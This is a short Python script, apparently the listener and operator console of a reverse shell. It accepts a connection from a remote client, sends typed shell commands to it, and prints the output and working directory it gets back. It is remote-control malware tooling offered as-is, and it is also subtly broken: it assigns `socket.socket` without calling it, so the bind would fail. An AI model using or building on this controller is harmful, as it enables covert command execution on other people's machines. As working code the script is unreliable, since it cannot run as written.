import socket
import server_config

SERVER_HOST = server_config.SERVER_HOST 
SERVER_PORT = server_config.SERVER_PORT
SEPERATOR = "<SEPERATOR>"
BUFFERSIZE = 1024 * 128 #128kib

s = socket.socket

s.bind((SERVER_HOST, SERVER_PORT))
s.listen(10) 
print(f"Server is active {SERVER_HOST}:{SERVER_PORT}") # No need because inspector.py is already active!

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFERSIZE).decode()
print("[+] Current Working Directory: ", cwd)

while True:
    command = input(f"{cwd} $/:> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "quit":
        # if command is "quit" then exit the shell
        break
    # Retrive the answer of the Remote Shell
    incoming_ans = client_socket.recv(BUFFERSIZE).decode()
    result, cwd = incoming_ans.split(SEPERATOR)
    print(result)
